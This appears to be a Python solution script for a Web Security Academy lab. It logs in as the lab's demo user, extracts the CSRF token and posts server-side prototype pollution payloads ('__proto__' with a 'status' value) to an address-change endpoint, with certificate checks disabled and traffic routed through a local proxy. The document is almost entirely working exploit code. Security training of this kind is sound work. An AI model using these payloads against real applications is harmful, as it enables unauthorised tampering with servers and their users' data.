import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0a2700bb04f00c4e803167cb00350014.web-security-academy.net"  #change to lab URL
username = "wiener"
password = "peter"

login_session = requests.session()
login_url = url + "/login"
r = login_session.get(login_url,verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
login_csrf_token = match.group(1)
print(f"login csrf token in {login_csrf_token}")

login_data = {"csrf":login_csrf_token,"username":username,"password":password}
r = login_session.post(login_url,verify=False,json=login_data)
session_value = login_session.cookies.get_dict()['session']
print(f"login success and session is {session_value}")

change_data = {"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":session_value,"__proto__":{"status":"555"}}
r = login_session.post(url+"/my-account/change-address",verify=False,json=change_data)

mal_data = '''{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"'''+session_value+'''""__proto__": {
    "status":555}}'''
headers = {
    "Content-Type": "application/json"
}
r = login_session.post(url+"/my-account/change-address",verify=False,data=mal_data,headers=headers)